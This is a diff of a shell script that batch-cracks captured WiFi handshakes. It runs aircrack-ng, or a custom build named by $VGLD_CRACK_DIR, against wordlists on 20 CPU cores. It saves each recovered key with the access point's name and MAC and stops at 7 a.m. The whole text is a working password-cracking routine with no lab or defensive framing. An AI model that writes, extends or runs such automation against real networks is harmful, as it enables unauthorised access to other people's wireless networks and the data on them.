@@ -5,12 +5,13 @@
 dir=$1
 cd $dir
 
-cpu_num=2
+cpu_num=20
 
 cap_dir="caps"
 oldcap_dir="$cap_dir/old_caps"
 dict_dir="dicts"
 out_dir="out"
+aircrack=$VGLD_CRACK_DIR/make
 
 smkdir $cap_dir
 smkdir $oldcap_dir
@@ -26,12 +27,11 @@ caps=$(ls $cap_dir/*.cap -1)
 
 for cap in $caps; do
     for dict in $dicts; do
-        ap_name=$(aircrack-ng $cap | head -6 | tail -1 | awk '{print $3}')
-        ap_mac=$(aircrack-ng $cap | head -6 | tail -1 | awk '{print $2}')
+        ap_name=$($aircrack $cap | head -6 | tail -1 | awk '{print $3}')
+        ap_mac=$($aircrack $cap | head -6 | tail -1 | awk '{print $2}')
         wanted=$out_dir/$ap_name\.txt
         echo \( $(date +%d\ %H:%M) \) working on $cap use $dict ......
-        # $VGLD_CRACK_DIR/make
-        aircrack-ng $cap -p $cpu_num -w $dict -l $wanted > /dev/null
+        $aircrack $cap -p $cpu_num -w $dict -l $wanted > /dev/null
         [ -f "$wanted" ] && { echo crack one done!; mv $cap $oldcap_dir/$ap_name.cap; echo $ap_mac >> $wanted; break; }
         [ "$(date +%H)" -eq '7' ] && exit
     done
